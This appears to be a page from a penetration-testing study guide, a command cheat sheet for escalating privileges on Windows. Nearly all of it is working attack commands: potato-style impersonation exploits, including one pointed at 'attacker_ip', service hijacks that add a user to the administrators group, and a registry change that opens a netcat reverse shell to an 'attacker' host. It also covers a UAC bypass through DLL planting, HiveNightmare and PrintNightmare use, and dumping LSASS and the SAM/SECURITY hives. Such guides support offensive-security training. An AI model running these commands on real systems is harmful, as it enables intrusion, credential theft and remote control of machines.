[← Back to Home](../README.md)

# 10 — Windows Privilege Escalation

Assumes you've already completed [Windows Enumeration & Situational Awareness](09-Windows-Enumeration-and-Situational-Awareness.md).

## 1. Initial Enumeration (memorize this)

```cmd
whoami
whoami /priv          # GOLD: SeImpersonate, SeDebug, SeBackup
whoami /groups
whoami /user

systeminfo
hostname
wmic os get Caption,Version,BuildNumber

ipconfig /all
arp -a
route print
netstat -ano

wmic product get name
wmic qfe list brief

tasklist /svc
sc query
schtasks /query /fo LIST /v

net user
net localgroup administrators
net accounts

# Check UAC
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

# Check protections
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

## 2. SeImpersonatePrivilege → SYSTEM

```cmd
# If whoami /priv shows SeImpersonatePrivilege: Enabled

# Windows Server 2019+ / Windows 10 1809+
PrintSpoofer64.exe -c "cmd.exe /c whoami > C:\temp\out.txt"

# Older systems
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *

# Alternative
RoguePotato.exe -r attacker_ip -e "cmd.exe"
```

## 3. Weak Permissions

**Replace a service binary:**
```cmd
# SharpUp flags: "Modifiable Service Binary"
icacls "C:\Program Files\App\service.exe"
# If Users:(F) → copy malicious.exe "C:\Program Files\App\service.exe"
sc start ServiceName
```

**Weak service configuration:**
```cmd
accesschk.exe -quvcw ServiceName
# If SERVICE_ALL_ACCESS is granted:
sc config ServiceName binpath="cmd /c net localgroup administrators user /add"
sc stop ServiceName
sc start ServiceName
# Error 1053 is expected — the command still executed
```

**Unquoted service path:**
```cmd
wmic service get name,pathname | findstr /v """
# If the path has spaces, no quotes, and you can write to a parent folder,
# e.g. C:\Program Files\App\service.exe:
copy shell.exe "C:\Program Files\App.exe"
```

**Registry ACLs:**
```powershell
# If accesschk shows KEY_ALL_ACCESS on a service's registry key:
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ServiceName -Name "ImagePath" -Value "C:\temp\nc.exe -e cmd.exe attacker 443"
sc start ServiceName
```

## 4. UAC Bypass (Admin but Medium Integrity)

```cmd
# Confirm you're in the admin group
whoami /groups | findstr Administrators

# Check for auto-elevation
findstr /C:"<autoElevate>true" C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe

# If auto-elevate is true and a writable PATH folder exists:
# drop srrstr.dll (msfvenom -f dll) into that writable folder, then trigger it
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
# whoami /groups should now show High Mandatory Level
```

## 5. Kernel Exploits

```cmd
# Check installed patches
wmic qfe list brief

# HiveNightmare (CVE-2021-36934)
icacls C:\Windows\System32\config\SAM
# If BUILTIN\Users:(I)(RX) → vulnerable
HiveNightmare.exe
# Then:
impacket-secretsdump -sam SAM -system SYSTEM local

# PrintNightmare (CVE-2021-34527)
ls \\localhost\pipe\spoolss
# If it exists:
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!"

# Always check for MS17-010 and MS08-067 on older systems
```

## 6. Named Pipes & Access Tokens

```cmd
# Enumerate pipes
pipelist.exe /accepteula
gci \\.\pipe\

# Check permissions
accesschk.exe -w \pipe\* -v
# Look for: Everyone, WRITE, FILE_ALL_ACCESS

# Services listening on localhost
netstat -ano | findstr 127.0.0.1
tasklist /FI "PID eq <PID>"
Get-CimInstance Win32_Service | ?{$_.ProcessId -eq PID}
```

See [Windows Process Communication & Access Tokens](11-Windows-Process-Communication-and-Access-Tokens.md) for the full deep-dive on this technique.

## 7. Credential Hunting

```cmd
findstr /si password *.txt *.xml *.ini
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
# Look for DefaultPassword

# LSASS dump
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
pypykatz lsa minidump lsass.dmp

# SAM + SYSTEM + SECURITY
reg save hklm\sam C:\sam.save
reg save hklm\system C:\system.save
reg save hklm\security C:\security.save
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

## Related Pages

- Prerequisite enumeration → [Windows Enumeration & Situational Awareness](09-Windows-Enumeration-and-Situational-Awareness.md)
- Deep-dive on the process/pipe technique → [Windows Process Communication & Access Tokens](11-Windows-Process-Communication-and-Access-Tokens.md)
- After you land SYSTEM → [Post-Exploitation](13-Post-Exploitation.md)
- Cracking any hashes you dump → [Password Cracking & Hash Attacks](06-Password-Cracking-and-Hash-Attacks.md)
